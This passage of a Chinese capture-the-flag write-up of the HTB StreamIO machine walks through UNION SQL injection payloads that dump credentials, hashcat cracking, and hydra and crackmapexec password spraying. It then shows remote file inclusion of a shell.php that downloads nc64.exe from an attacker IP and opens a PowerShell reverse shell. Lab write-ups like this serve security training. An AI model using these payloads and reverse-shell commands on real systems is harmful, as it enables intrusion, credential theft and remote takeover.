+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 -- -   null    all  直接提示被禁5分钟，但还是能正常搜的（这里我猜是模拟有waf的情况做的纯文本页面）</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里的搜索框是支持模糊搜索的，比如搜 ime，会显示 time 字段，很正常</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from movies where name like &#x27;%[input]%&#x27;;			可能的后台查询语法</span><br></pre></td></tr></table></figure>
+
+<h3 id="发现存在漏洞"><a href="#发现存在漏洞" class="headerlink" title="发现存在漏洞"></a>发现存在漏洞</h3><p>**输入 **<code>man &#39;;-- -</code> 依然能获得正常的返回结果，但不可能有带 <code>;--</code> 的电影名，证明有注入存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man &#x27;;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215656407.png" alt="image-20260323215045150"></p>
+<p><strong>刚才有</strong><code>or</code> 不可以，那用 <code>and</code> 试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; and 1=1 -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215705706.png" alt="image-20260323215325342"></p>
+<p><strong>依然有正常结果，确实有漏洞</strong></p>
+<h3 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1 -- -        无结果，之后逐渐增加列数</span><br><span class="line">redteamnote&#x27; union select 1,2 -- -</span><br><span class="line">...</span><br><span class="line">redteamnote&#x27; union select 1,2,3,4,5,6 -- -      直到第六列显示结果，回显2，3位置的语句</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215707586.png" alt="image-20260324164838399"></p>
+<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1,@@version,3,4,5,6 -- -          爆出SQL sever的版本</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215711416.png" alt="image-20260324165041254"></p>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#因为这是SQL sever的数据库（master），跟MySQL的数据库结构不同（information_schema）</span><br><span class="line"></span><br><span class="line">redteamnote&#x27; union select 1,name,3,4,5,6 from master..sysdatabases;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215713057.png" alt="image-20260324165708093"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1,(select db_name()),3,4,5,6 from master..sysdatabases;-- -</span><br><span class="line">#查看当前数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215715821.png" alt="image-20260324170141221"></p>
+<p><code>STREAMIO</code> 是当前跑的数据库——凭据信息关键</p>
+<p><code>streamio_backup</code> 有历史信息</p>
+<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1,name,id,4,5,6 from streamio..sysobjects where xtype=&#x27;U&#x27;;-- -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>作用：枚举所有用户表</strong></p>
+<p><code>streamio</code>：目标数据库名</p>
+<p><code>sysobjects</code>：系统表，存储数据库所有对象信息</p>
+<p><code>xtype=&#39;U&#39;</code>：筛选类型为 User Table（用户表）排除系统表，只获取业务表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1, name, id, 4, 5, 6 </span><br><span class="line">FROM streamio..sysobjects </span><br><span class="line">WHERE xtype = &#x27;U&#x27;</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215719899.png" alt="image-20260324170943397"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1,name,id,4,5,6 from streamio_backup..sysobjects where xtype=&#x27;U&#x27;;-- -</span><br><span class="line">#streamio_backup库会发现没有任何信息，正常网站没有直接挂两个数据库的</span><br></pre></td></tr></table></figure>
+
+<h3 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redteamnote&#x27; union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -</span><br><span class="line"></span><br><span class="line">#进一步枚举上面movies 885578193和users 901578250的列名     #这里只查name，id其实不用查了，带着也无所谓</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>syscolumns</code>：系统表，存储所有表的列信息。每个表有多少列，列名是什么，数据类型等都记录在这里</p>
+<p><code>where id in (885578193,901578250)</code> 筛选条件：只查这两个表的列信息</p>
+<ul>
+<li><code>id</code> 字段对应表的 ID</li>
+<li><code>in</code> 操作符同时查询两个表</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215724144.png" alt="image-20260324172113171"></p>
+<h3 id="用户名；密码"><a href="#用户名；密码" class="headerlink" title="用户名；密码"></a>用户名；密码</h3><p><strong>因为当前数据库连接的就算</strong><code>streamio</code> 不指定也行，直接查 user 表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redteamnotes&#x27; union select 1,concat(username,&#x27;;&#x27;,password),3,4,5,6 from users;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215726456.png" alt="image-20260324172618679"></p>
+<h3 id="整理用户名密码"><a href="#整理用户名密码" class="headerlink" title="整理用户名密码"></a>整理用户名密码</h3><p>**先复制的相关源码保存在 **<code>creds_in_html</code> ，然后筛出带 <code>h5</code> 的句子</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215731200.png" alt="image-20260324172917514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215733844.png" alt="image-20260324173018968"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215739080.png" alt="image-20260324173103179"></p>
+<h2 id="hashcat-暴力破解"><a href="#hashcat-暴力破解" class="headerlink" title="hashcat 暴力破解"></a>hashcat 暴力破解</h2><p>**可以 **<code>hash-identifier</code> 识别一下，是 MD5 加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat creds /usr/share/wordlists/rockyou.txt --user -m 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215735752.png" alt="image-20260324173513466"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat creds /usr/share/wordlists/rockyou.txt --user -m 0 --show | tee cracked-passwords</span><br><span class="line"></span><br><span class="line">#查看破解出的密码并将他们保存在cracked-passwords</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>tee</code> 是一个 <strong>Unix&#x2F;Linux 命令行工具</strong>，用于<strong>同时将输出显示在屏幕并写入文件</strong>。</p>
+<p><strong>用法</strong>	<code>command | tee [选项] 文件名</code></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215742909.png" alt="image-20260324173753172"></p>
+<h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215745231.png" alt="image-20260324174259109"></p>
+<h2 id="crackmapexec-密码喷射-smb-系统服务"><a href="#crackmapexec-密码喷射-smb-系统服务" class="headerlink" title="crackmapexec 密码喷射 smb 系统服务"></a>crackmapexec 密码喷射 smb 系统服务</h2><p><strong>测试得到的密码的有效性</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb streamio.htb -u user -p pass --continue-on-success</span><br><span class="line"></span><br><span class="line">#这里user 和pass是文件 </span><br><span class="line">#--continue-on-success 表示成功了也继续尝试</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215746814.png" alt="image-20260324174519652"></p>
+<p><strong>这里 smb 系统登录，所有用户名密码都没用</strong></p>
+<p>**那接下来尝试 web 登录，之前 **<code>feroxbuster</code> 目录爆破有一个 <code>login.php</code> 页面</p>
+<p><strong>有</strong><code>username和password</code> 两个表单，失败会提示 <code>login failed</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215748337.png" alt="image-20260324180815311"></p>
+<h2 id="hydra-网页登录密码喷射"><a href="#hydra-网页登录密码喷射" class="headerlink" title="hydra 网页登录密码喷射"></a>hydra 网页登录密码喷射</h2><p><strong>将</strong><code>用户名:密码</code> 专门提取出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215759748.png" alt="image-20260324181443821"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215757201.png" alt="image-20260324181408910"></p>
+<p><strong>尝试破解</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -C userpass streamio.htb https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Failed&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-C</code>：使用<strong>冒号分隔</strong>的用户名:密码组合文件</p>
+<p><code>https-post-form</code> 协议&#x2F;模块：使用 HTTPS 协议的 POST 表单攻击。针对需要 POST 提交用户名密码的登录表单</p>
+<p><code>&quot;&lt;URL路径&gt;:&lt;POST数据&gt;:&lt;失败标识&gt;&quot;</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>内容</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>URL 路径</strong></td>
+<td><code>/login.php</code></td>
+<td><strong>登录表单提交的地址</strong></td>
+</tr>
+<tr>
+<td><strong>POST 数据</strong></td>
+<td><code>username=^USER^&amp;password=^PASS^</code></td>
+<td><strong>提交的表单字段 ^USER^ 和 ^PASS^ 是占位符 会被 userpass 文件中的实际值替换</strong></td>
+</tr>
+<tr>
+<td><strong>失败标识</strong></td>
+<td><code>Failed</code></td>
+<td><strong>登录失败的页面特征文本 Hydra 根据页面是否包含此字符串判断失败</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215804556.png" alt="image-20260324181145519"></p>
+<p>**成功破解出可登录的用户名密码           **<code>yoshihide</code> 与 <code>66boysandgirls ..</code></p>
+<p><strong>使用该用户名密码可以成功进入，右上角有</strong><code>LOGOUT</code> 的字样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215806191.png" alt="image-20260324181226268"></p>
+<h1 id="靶机精讲：HTB-StreamIO-立足点之战-又一波技能考验：参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权"><a href="#靶机精讲：HTB-StreamIO-立足点之战-又一波技能考验：参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权" class="headerlink" title="靶机精讲：HTB StreamIO 立足点之战 - 又一波技能考验：参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权"></a>靶机精讲：HTB StreamIO 立足点之战 - 又一波技能考验：参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权</h1><p><strong>参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权</strong></p>
+<h2 id="管理页面渗透分析"><a href="#管理页面渗透分析" class="headerlink" title="管理页面渗透分析"></a>管理页面渗透分析</h2><h3 id="master-php"><a href="#master-php" class="headerlink" title="master.php"></a>master.php</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215809917.png" alt="image-20260324200203953"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215812051.png" alt="image-20260324200230875"></p>
+<h3 id="admin-目录"><a href="#admin-目录" class="headerlink" title="admin 目录"></a>admin 目录</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215819321.png" alt="image-20260324200124852"></p>
+<p><strong>比较简陋，一般不是框架，是自己搭建的，可能会有漏洞</strong></p>
+<h4 id="user-management"><a href="#user-management" class="headerlink" title="user management"></a>user management</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215821003.png" alt="image-20260324200409420"></p>
+<p><strong>可以看到几个用户，下面两个是注册的记录，但那时候注册了也登不进去</strong></p>
+<h4 id="staff-management"><a href="#staff-management" class="headerlink" title="staff management"></a>staff management</h4><p><strong>很多，最下面是我们登录的用户名</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215823765.png" alt="image-20260324200655538"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215826133.png" alt="image-20260324200538159"></p>
+<h4 id="movie-management"><a href="#movie-management" class="headerlink" title="movie management"></a>movie management</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215828053.png" alt="image-20260324200728453"></p>
+<h4 id="leave-a-message-for-admin"><a href="#leave-a-message-for-admin" class="headerlink" title="leave a message for admin"></a>leave a message for admin</h4><p><strong>没有任何内容</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215836329.png" alt="image-20260324200834598"></p>
+<p>**可以看到这几个页面 url 都有一个 **<code>?xxx=</code>  而且我们 <code>master.php</code> 无法访问，只能包含。是否可以通过这个地方包含呢？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215839338.png" alt="image-20260324200230875"></p>
+<p><strong>或者有没有可能除了这几个参数，还有隐藏参数没有暴露呢？</strong></p>
+<h2 id="wfuzz-参数模糊测试"><a href="#wfuzz-参数模糊测试" class="headerlink" title="wfuzz 参数模糊测试"></a>wfuzz 参数模糊测试</h2><p><strong>由于是登陆状态，需要给</strong><code>wfuzz</code> <code>cookie</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112426.png" alt="image-20260324201519937"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u https://streamio.htb/admin/?FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H &quot;cookie: PHPSESSID=dacludv1e6fujhn087kindlq&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-w</code>：指定爆破字典路径（<code>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</code>，Kali 内置的 Burp 参数名字典，适配 Web 参数爆破场景）</p>
+<p><code>-H</code>：自定义 HTTP 请求头（此处为 <code>cookie: PHPSESSID=dacludv1e6fujhn087kindlq</code>，携带 PHP 会话凭证，模拟已登录状态爆破）</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215842586.png" alt="image-20260324201655075"></p>
+<p><strong>一般要先运行一下，然后 hide 隐藏掉出现次数多的没用的结果，这里是 1678</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u https://streamio.htb/admin/?FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H &quot;cookie: PHPSESSID=dacludv1e6fujhn087kindlq&quot; --hh 1678</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215858415.png" alt="image-20260324202149880"></p>
+<p><code>toppool</code> 参数为空页</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215905600.png" alt="image-20260324202234949"></p>
+<p><code>debug</code> 参数，“只有管理员能用”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215849894.png" alt="image-20260324202307485"></p>
+<p><code>debug</code> 本身是调试的意思，后面我们跟上其他页面如 <code>index.php</code> 和 <code>master.php</code> 之类的会怎么样？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215913034.png" alt="image-20260324202619700"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215909371.png" alt="image-20260324202659234"></p>
+<p><strong>确实有异常，把 movie，staff，user 页面都显示出来到了这个页面上，说明它一个就包括了这些内容</strong></p>
+<h2 id="伪协议文件包含"><a href="#伪协议文件包含" class="headerlink" title="伪协议文件包含"></a>伪协议文件包含</h2><p><strong>php 开发知识：如果能通过调试的方式访问页面，那推测很有可能有文件包含。</strong></p>
+<p><strong>“调试”和“正常访问”是有区别的</strong></p>
+<p><strong>伪协议就是用来实现调试 master 这个 php 页面的</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6772">浅谈文件包含漏洞-先知社区</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215926677.png" alt="image-20260324203359405"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=php://filter/read=convert.base64-encode/resource=master.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个方法是用来读源码的，如果直接跟 master.php 的话是直接执行了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215928715.png" alt="image-20260324203802287"></p>
+<p><strong>这里成功看到 base64 编码的文件</strong></p>
+<p>**解码后保存 **<code>cat master_base64 | base64 -d | tee master.php</code></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215930553.png" alt="image-20260324203959782"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215933604.png" alt="image-20260324204043909"></p>
+<p><strong>最后这一段：如果包含且不是 index.php，就以 POST 执行。</strong></p>
+<p><strong>可以根据这个构造反弹 shell</strong></p>
+<h2 id="构造反弹-shell"><a href="#构造反弹-shell" class="headerlink" title="构造反弹 shell"></a>构造反弹 shell</h2><p><strong>因为是 Windows 靶机，需要我们传一个 nc 到靶机，好让靶机反连 kali，进行反弹 shell</strong></p>
+<p><strong>我们先在 kali 的渗透目录下去 github 下载一个</strong><code>nc.exe</code> 文件</p>
+<p><strong>然后</strong><code>vim shell.php</code> 写入下面的两条内容（一个一行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;powershell -c wget kaliIP/nc64.exe -outfile \\programdata\\nc64.exe&quot;);</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>组成部分</strong></th>
+<th><strong>作用 &#x2F; 含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>system()</code></td>
+<td><strong>编程语言（如 PHP&#x2F;ASP）的系统命令执行函数，用于调用目标主机的系统命令（此处调用 Windows 的 powershell）；</strong></td>
+</tr>
+<tr>
+<td><code>powershell -c</code></td>
+<td><strong>启动 PowerShell 并执行后续的单条命令（</strong><code>-c</code> 是 <code>-Command</code> 的简写，PowerShell 核心执行参数）；</td>
+</tr>
+<tr>
+<td><code>wget 10.10.16.64/nc64.exe</code></td>
+<td><strong>PowerShell 中</strong><code>wget</code> 是 <code>Invoke-WebRequest</code> 的别名，作用是从攻击机（IP：10.10.16.64）下载 <code>nc64.exe</code>（64 位 Netcat 工具，后门核心）；</td>
+</tr>
+<tr>
+<td><code>-outfile \\programdata\\nc64.exe</code></td>
+<td><strong>指定下载文件的保存路径和文件名：-</strong><code>\\programdata\\</code>：Windows 系统的隐藏目录（所有用户可读写，无权限限制，适合存放后门）；-<code>nc64.exe</code>：保存的文件名（64 位 NC 程序）；- 双反斜杠 <code>\\</code> 是编程语言中转义后的路径分隔符（原生 Windows 路径是 <code>\</code>）；</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;\\programdata\\nc64.exe -e powershell kaliIP :443&quot;);</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>组成部分</strong></th>
+<th><strong>作用 &#x2F; 含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>\\programdata\\nc64.exe</code></td>
+<td><strong>调用第一步下载到目标主机的 64 位 NC 程序（路径与第一步保存路径一致）；</strong></td>
+</tr>
+<tr>
+<td><code>-e powershell</code></td>
+<td><strong>NC 的核心反弹参数：</strong><code>-e</code>（<code>-exec</code>）表示 “执行指定程序”，此处指定执行 <code>powershell</code>（反弹后攻击机获得 PowerShell 交互终端）；</td>
+</tr>
+<tr>
+<td><code>10.10.16.16:443</code></td>
+<td><strong>攻击机的 IP（10.10.16.16）和监听端口（443）：- 443 是 HTTPS 默认端口，常用于绕过防火墙（防火墙通常允许 443 端口出站）；- 目标主机通过 NC 连接该 IP: 端口，将 PowerShell 终端反向传递给攻击机；</strong></td>
+</tr>
+</tbody></table>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220004019.png" alt="image-20260324205506784"></p>
+<h3 id="启动-web-服务器"><a href="#启动-web-服务器" class="headerlink" title="启动 web 服务器"></a>启动 web 服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m http.server 80</span><br><span class="line">sudo php -S 0:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220006075.png" alt="image-20260324205646880"></p>
+<h3 id="建立监听"><a href="#建立监听" class="headerlink" title="建立监听"></a>建立监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220010553.png" alt="image-20260324205816747"></p>
+<p><strong>下面就是用文件包含，访问 kali web 服务器的 shell，看能否执行反弹</strong></p>
+<p><code>burpsuit和curl</code> 都可以</p>
+<h3 id="curl-远程文件包含-shell-php"><a href="#curl-远程文件包含-shell-php" class="headerlink" title="curl 远程文件包含 shell.php"></a>curl 远程文件包含 shell.php</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215944605.png" alt="image-20260324210115940"></p>
+<p><strong>cookie 的数据要带着</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220015798.png" alt="image-20260324204043909"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#x27;https://streamio.htb/admin/?debug=master.php&#x27; -K -b &#x27;PHPSESSID=dacludv1e6fujhn087kindlq&#x27; -d &#x27;include=http://kaliIP/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>作用 &#x2F; 含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>curl</code></td>
+<td><strong>Linux 下的命令行 HTTP 客户端，用于模拟 HTTP 请求（此处模拟 POST 请求攻击）；</strong></td>
+</tr>
+<tr>
+<td><code>-X POST</code></td>
+<td><strong>指定 HTTP 请求方法为 POST（强制发起 POST 请求，匹配目标页面的请求方式）；</strong></td>
+</tr>
+<tr>
+<td><code>&quot;https://streamio.htb/admin/?debug=master.php&quot;</code></td>
+<td><strong>目标攻击 URL：- 后台路径</strong><code>/admin/</code>（需登录权限）；-<code>debug=master.php</code> 是触发漏洞的参数；</td>
+</tr>
+<tr>
+<td><code>-b &quot;PHPSESSID=xxx&quot;</code></td>
+<td><strong>携带 Cookie（PHP 会话凭证），模拟已登录状态（绕过后台登录验证，是攻击成功的关键）；</strong></td>
+</tr>
+<tr>
+<td><code>-d &#39;include=http://10.10.16.16/shell.php&#39;</code></td>
+<td><strong>发送 POST 数据：-</strong><code>include</code> 是目标页面的文件包含参数；-<code>http://10.10.16.16/shell.php</code> 是攻击者搭建的恶意 PHP 脚本地址，利用文件包含漏洞执行该脚本；</td>
+</tr>
+</tbody></table>
+<h2 id="获得系统立足点-yoshihide-用户-shell"><a href="#获得系统立足点-yoshihide-用户-shell" class="headerlink" title="获得系统立足点 yoshihide 用户 shell"></a>获得系统立足点 <code>yoshihide</code> 用户 shell</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220019472.png" alt="image-20260324210614215"></p>
+<p><strong>出现下载日志并成功反弹 shell</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220021468.png" alt="image-20260324210829480"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220031289.png" alt="image-20260324210908614"></p>
+<p><strong>当前用户没用家目录，说明可能只用于 web</strong></p>
+<p><strong>而</strong><code>nikk37</code> 无访问权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220027580.png" alt="image-20260324214458779"></p>
+<p><strong>提升 shell 交互性，重新反弹一下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap -cAr nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220101152.png" alt="image-20260324211052190"></p>
+<h2 id="掳掠备份数据库"><a href="#掳掠备份数据库" class="headerlink" title="掳掠备份数据库"></a>掳掠备份数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir -recurse *.php | select-string -pattern &quot;database&quot;</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><code>-recurse</code></th>
+<th><strong>递归遍历当前目录（</strong><code>streamio.htb</code>）下的所有子目录；</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>select-string</code></td>
+<td><strong>PowerShell 的 “字符串搜索” 命令（类似 Linux 的</strong><code>grep</code>）；</td>
+</tr>
+<tr>
+<td><code>-pattern &quot;database&quot;</code></td>
+<td><strong>指定搜索关键词为 “database”（大小写不敏感，匹配数据库相关配置）；</strong></td>
+</tr>
+</tbody></table>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112427.png" alt="image-20260324211753398"></p>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>取值</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Database</code></td>
+<td><code>STREAMIO</code></td>
+<td><strong>数据库名称</strong></td>
+</tr>
+<tr>
+<td><code>UID</code></td>
+<td><code>db_admin</code>&#x2F;<code>db_user</code></td>
+<td><strong>数据库登录账号（管理员 &#x2F; 普通用户）</strong></td>
+</tr>
+<tr>
+<td><code>PWD</code></td>
+<td><code>B1@xxxx</code></td>
+<td><strong>数据库明文密码（硬编码在源码中，核心漏洞）</strong></td>
+</tr>
+</tbody></table>
+<p><strong>这里靶机本身有</strong><code>sqlcmd</code> 并且提升了 shell 交互性，可以直接在靶机上连接 SQL server 数据库；</p>
+<p><strong>否则要通过端口转发在 kali 上连接（有时候访问靶机操作比较慢，而且不想留下太多活动信息需要这么做）</strong></p>
+<blockquote>
